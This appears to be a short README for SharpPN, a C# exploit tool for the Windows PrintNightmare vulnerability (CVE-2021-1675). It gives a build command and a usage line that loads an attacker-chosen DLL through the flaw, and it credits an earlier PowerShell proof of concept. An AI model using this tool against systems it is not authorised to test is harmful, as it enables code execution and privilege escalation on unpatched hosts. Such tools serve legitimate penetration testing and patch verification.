# C# PrintNightmare (CVE-2021-1675)

You'll need a DLL to use SharpPN. So once you have that, just build and specify the dll path in the command-line arguments.

## Build  
You can build yourself with `C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe -out:SharpPN.exe C:\Path\to\Program.cs` or by opening the .sln file with Visual Studio and building there.

## Usage  
`.\SharpPN.exe -DLL C:\path\to\your\dll`  

![Alt text](/images/SharpPN_Working.PNG)


### References  
Caleb Stewart & John Hammond's PowerShell PoC: https://github.com/calebstewart/CVE-2021-1675
